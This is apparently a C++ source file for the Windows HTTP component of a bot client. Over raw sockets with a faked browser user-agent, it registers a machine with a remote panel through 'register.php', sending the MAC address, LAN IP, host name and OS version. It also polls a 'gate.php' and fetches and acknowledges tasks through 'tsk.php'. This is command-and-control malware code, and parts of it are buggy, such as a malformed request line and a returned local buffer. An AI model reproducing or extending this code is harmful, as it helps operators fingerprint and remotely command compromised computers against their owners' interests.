#include "s_classes.h"

#include <winsock2.h>
#include <windows.h>
#include <sstream>
#include <string>
#include <iostream>


#pragma comment(lib,"ws2_32.lib")


char* httprp::getrp(char* Domain_name,int Port_no, char* Head_api){
	
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
		//cout << "WSAStartup failed.\n";
		//system("pause");
		
		return "WSAStartup failed.";
	};
	
	SOCKET Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP); // Set as TCP
	struct hostent *host;
	host = gethostbyname(Domain_name);
	
	SOCKADDR_IN SockAddr;
	SockAddr.sin_port=htons(Port_no);
	SockAddr.sin_family=AF_INET;
	SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
	
	//cout << "Connecting...\n";
	
	if(connect(Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr)) != 0){
		//cout << "Could not connect";
		//system("pause");
		
		return "Could not connect";
	}
	// cout << "Connected.\n";
	// send(Socket,"GET /tapi.php?ap=thisisareallylongbigbigbanana HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n", strlen("GET /tapi.php?ap=thisisareallylongbigbigbanana HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"),0);
	
	std::stringstream ss;
	
	ss << "GET "<< Head_api << "\r\n HTTP/1.1\r\n"
	<< "Host: "<< Domain_name << "" 
	<< "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)\r\n"
	<< "Accept: text/html\r\n"
	<< "Accept-Charset: utf-8\r\n"
	<< "Keep-Alive: 300\r\n"
	<< "Connection: close\r\n"
	<< "Pragma: no-cache\r\n"
	<< "Cache-Control: no-cache"
	<< "\r\n\r\n\r\n";
	
    std::string request = ss.str();
	
	if (send(Socket, request.c_str(), request.length(), 0) != (int)request.length()) {
		//cout << "Error sending request." << endl;
		return "Error sending request";
	}
	
	char buffer[10000];
	int nDataLength;
	char ret[10000];
	while ((nDataLength = recv(Socket,buffer,10000,0)) > 0){        
		int i = 1;
		int j =0;
		while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r') {

			//std::cout << ret[i-2] << nDataLength << std::endl; // do not post after request, just return data.
		//	ret[i-2] = buffer[i];
		
		if(isalnum(buffer[i])){
			ret[j] = buffer [i];
			i++;
			j++;
		}else if(buffer[i] == ';'){
			ret[j] = buffer [i];
			i++;
			j++;
		}else{
			i++;
		}


		}
		buffer[i] = '\0'; 
		ret[j] = '\0';
		// finish the string at the end of the transmission, if not 
		// used block will be displayed from || char buffer[10000]; 
	
	}
	
	closesocket(Socket); // close socket.
	WSACleanup();//always cleanup!
	// system("pause");



	return ret;
}


char* httprp::post_gate(char* wp){
	std::stringstream ss;
	Machine_inf lcl_inf;
	char* xx = "";
	
	ss << wp
	<< "gate.php?uid=" 
	<< lcl_inf.getMAC();
	
	std::string request = ss.str();
	xx = strdup(request.c_str());

	return xx;
};

char* httprp::post_reg(char* wp){
	std::stringstream ss;
	Machine_inf lcl_inf;
	char* xx= "";
	ss << wp
	<< "register.php?uid=" 
	<< lcl_inf.getMAC()
	<< "&lan=" 
	<< lcl_inf.lan_ip()
	<< "&nm=" 
	<< lcl_inf.host_name()
	<< "&os=" 
	<< lcl_inf.OS_version();
	
	std::string request = ss.str();
	xx = strdup(request.c_str());
	
	return xx;
};

char* httprp::post_task(char* wp, char* taskn){
	std::stringstream ss;
	Machine_inf lcl_inf;
	char* xx = "";
	ss << wp
	<< "tsk.php?uid=" 
	<< lcl_inf.getMAC()
	<< "&t="
	<< taskn;
	
	std::string request = ss.str();
	xx = strdup(request.c_str());
	
	return xx;
};

char* httprp::task_done(char* wp, int taskn){
	std::stringstream ss;
	Machine_inf lcl_inf;
	char* xx = "";
	ss << wp
	<< "tsk.php?uid=" 
	<< lcl_inf.getMAC()
	<< "&t=c;"
	<< taskn;
	
	std::string request = ss.str();
	xx = strdup(request.c_str());
	
	return xx;
};